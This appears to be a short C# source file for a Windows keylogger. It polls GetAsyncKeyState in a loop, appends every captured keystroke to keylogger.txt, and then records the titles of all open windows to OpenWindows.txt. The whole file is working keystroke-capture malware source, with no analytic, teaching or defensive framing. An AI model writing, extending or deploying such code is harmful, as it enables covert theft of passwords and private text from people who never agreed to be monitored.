using System;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace keyLog
{
    public static class keyLogger
    {
        [DllImport("user32.dll")]
        static extern void GetWindowText(int hWnd, StringBuilder text, int count);

        delegate bool CallbackDef(int hWnd, int iParam);

        [DllImport("user32.dll")]
        static extern int EnumWindows(CallbackDef callBack, int iParam);

        static bool PrintWindow(int hWnd, int iParam)
        {
            StringBuilder text = new StringBuilder(255);
            GetWindowText(hWnd, text, 255);
            int n = text.Length;
            string str = string.Empty;
            str = text.ToString();
            if (n != 0 && !str.StartsWith(".") && !str.StartsWith("Default") && !str.StartsWith("MSCT") && !str.StartsWith("AcI") && !str.StartsWith("Realtek") && !str.StartsWith("Cic"))
            {
                File.AppendAllText("OpenWindows.txt", str + "\n");
            }

            return true;
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [STAThread]
        public static void run()
        {
            string buf = string.Empty;
            int count = 0;
            while (count <= 18000)
            {
                Thread.Sleep(100);
                count += 100;
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space)
                        {
                            buf += " ";
                            continue;
                        }

                        if (((Keys)i) == Keys.Enter)
                        {
                            buf += "\n";
                            continue;
                        }

                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                        {
                            continue;
                        }

                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += ((Keys)i).ToString();
                        }

                        File.AppendAllText("keylogger.txt", buf);
                        buf = string.Empty;
                    }
                }
            }

            CallbackDef callback = new CallbackDef(PrintWindow);
            EnumWindows(callback, 0);
        }
    }
}